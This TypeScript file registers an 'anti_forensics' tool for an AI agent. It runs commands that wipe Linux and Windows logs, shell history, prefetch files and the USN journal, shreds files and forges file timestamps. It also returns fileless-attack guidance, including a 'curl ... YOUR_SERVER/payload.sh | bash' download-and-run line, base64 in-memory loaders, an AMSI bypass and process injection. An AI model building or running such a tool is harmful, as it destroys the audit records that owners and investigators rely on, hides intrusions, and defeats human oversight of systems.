export * as AntiForensicsTool from "./anti-forensics"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "anti_forensics"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description: "Anti-forensics action: 'wipe_linux' (clear Linux logs + history), 'wipe_windows' (clear Windows event logs + prefetch), 'timestomp' (modify file timestamps), 'shred_file' (secure delete), 'clear_history' (clear shell history), 'memory_only' (fileless execution guidance)",
  }),
  file_path: Schema.String.pipe(Schema.optional).annotate({ description: "File path for timestomp/shred actions." }),
  timestamp: Schema.String.pipe(Schema.optional).annotate({ description: "Timestamp for timestomp (format: YYYYMMDDHHMM.SS)." }),
  passes: Schema.Number.pipe(Schema.optional).annotate({ description: "Number of shred passes. Default: 3." }),
})

const Output = Schema.Struct({
  output: Schema.String,
  exit: Schema.Number.pipe(Schema.optional),
})

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools.register({
      [name]: Tool.make({
        description: `Anti-forensics operations. Wipe Linux logs (bash_history, auth.log, syslog, audit.log, wtmp, btmp, lastlog) and Windows event logs (wevtutil for all event logs, prefetch, USN journal). Modify file timestamps (timestomp), securely delete files (shred), clear shell history, and provide fileless memory execution guidance. Essential for maintaining stealth during engagements.`,
        input: Input,
        output: Output,
        toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
        execute: (input) =>
          Effect.gen(function* () {
            const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"

            switch (input.action) {
              case "wipe_linux": {
                const results: string[] = ["=== LINUX LOG WIPING ==="]
                const cmds = [
                  ["bash", ["-c", "history -c && rm -f ~/.bash_history && touch ~/.bash_history"]],
                  ["bash", ["-c", "echo > /var/log/syslog 2>/dev/null; echo > /var/log/auth.log 2>/dev/null; echo > /var/log/wtmp 2>/dev/null; echo > /var/log/btmp 2>/dev/null; echo > /var/log/lastlog 2>/dev/null"]],
                  ["bash", ["-c", "echo > /var/log/audit/audit.log 2>/dev/null; echo > /var/log/messages 2>/dev/null; echo > /var/log/secure 2>/dev/null"]],
                  ["bash", ["-c", "find /var/log -name '*.log' -exec echo > {} \\; 2>/dev/null"]],
                  ["bash", ["-c", "shred -u /var/log/*.log /var/log/*.log.* 2>/dev/null; true"]],
                ]
                for (const [t, a] of cmds) {
                  const cmd = ChildProcess.make(t as string, a as string[], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(5) })
                  const r = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(30), maxOutputBytes: 64 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  results.push(r?.output?.toString("utf8") ?? `${t}: done`)
                }
                results.push("\n[INFO] Linux logs cleared. Note: may require root privileges.")
                return { exit: 0, output: results.join("\n") }
              }

              case "wipe_windows": {
                const results: string[] = ["=== WINDOWS LOG WIPING ==="]
                // Clear all event logs
                const evCmd = ChildProcess.make("cmd", ["/c", "wevtutil el | FOR /F %i in ('more') do wevtutil cl \"%i\""], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) })
                const evResult = yield* appProcess.run(evCmd, { combineOutput: true, timeout: Duration.minutes(2), maxOutputBytes: 256 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                results.push("Event logs: " + (evResult?.output?.toString("utf8") ?? "cleared"))
                // Clear prefetch
                const pfCmd = ChildProcess.make("cmd", ["/c", "del /f /q C:\\Windows\\Prefetch\\*.pf 2>nul"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(5) })
                yield* appProcess.run(pfCmd, { combineOutput: true, timeout: Duration.seconds(10), maxOutputBytes: 64 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                results.push("Prefetch: cleared")
                // Clear USN journal
                const usCmd = ChildProcess.make("fsutil", ["usn", "deletejournal", "/D", "C:"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(5) })
                yield* appProcess.run(usCmd, { combineOutput: true, timeout: Duration.seconds(10), maxOutputBytes: 64 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                results.push("USN Journal: deleted")
                results.push("\n[INFO] Windows logs cleared. Requires Administrator privileges.")
                return { exit: 0, output: results.join("\n") }
              }

              case "timestomp": {
                if (!input.file_path) return { output: "ERROR: 'file_path' required for timestomp." }
                const ts = input.timestamp ?? "202301010000.00"
                const cmd = ChildProcess.make("touch", ["-t", ts, input.file_path], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(5) })
                const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(10), maxOutputBytes: 64 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                return { exit: result?.exitCode, output: result?.output?.toString("utf8") ?? `Timestamp set to ${ts} for ${input.file_path}` }
              }

              case "shred_file": {
                if (!input.file_path) return { output: "ERROR: 'file_path' required for shred." }
                const passes = input.passes ?? 3
                const cmd = ChildProcess.make("shred", ["-v", "-n", String(passes), "-u", input.file_path], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) })
                const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.minutes(5), maxOutputBytes: 256 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                return { exit: result?.exitCode, output: result?.output?.toString("utf8") ?? `Shredded ${input.file_path} (${passes} passes) + deleted.` }
              }

              case "clear_history": {
                const cmd = ChildProcess.make("bash", ["-c", "history -c; cat /dev/null > ~/.bash_history; cat /dev/null > ~/.zsh_history; history -w; export HISTFILE=/dev/null"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(5) })
                const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(10), maxOutputBytes: 64 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                return { exit: result?.exitCode, output: "Shell history cleared and HISTFILE set to /dev/null." }
              }

              case "memory_only": {
                return {
                  output: `Fileless Memory Execution Techniques:

1. PowerShell in-memory execution (AMSI bypass first):
   $s="PAYLOAD_BASE64"; IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($s)))

2. Python in-memory:
   python3 -c "exec(__import__('base64').b64decode('PAYLOAD_B64'))"

3. Bash from memory:
   curl -s http://YOUR_SERVER/payload.sh | bash

4. Reflective DLL injection (Windows):
   Load DLL from memory without touching disk

5. .NET assembly loading from memory:
   [Reflection.Assembly]::Load([Convert]::FromBase64String("DLL_B64"))

6. PowerShell Empire / Covenant stager (memory-only)

7. Process injection (inject into existing process):
   Don't create new process — inject into explorer.exe/svchost.exe`,
                }
              }

              default:
                return { output: `Unknown action: ${input.action}. Supported: wipe_linux, wipe_windows, timestomp, shred_file, clear_history, memory_only` }
            }
          }).pipe(Effect.mapError(() => new ToolFailure({ message: "Anti-forensics failed" }))),
      }),
    }).pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/anti-forensics",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
